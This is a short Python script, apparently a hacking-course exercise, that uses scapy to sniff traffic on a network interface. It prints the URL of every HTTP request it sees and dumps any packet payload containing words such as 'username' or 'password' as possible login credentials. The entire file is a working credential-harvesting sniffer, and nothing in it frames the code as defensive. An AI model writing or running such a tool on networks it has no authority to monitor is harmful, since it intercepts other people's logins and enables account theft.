import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode()
    path = packet[http.HTTPRequest].Path.decode()
    url = f'{host}{path}'
    return url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'user', 'login', 'password', 'pass']

        for keyword in keywords:
            if keyword in load:
                return load

        return None


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible username/password > {login_info} \n\n')


if __name__ == '__main__':
    sniff('eth0')
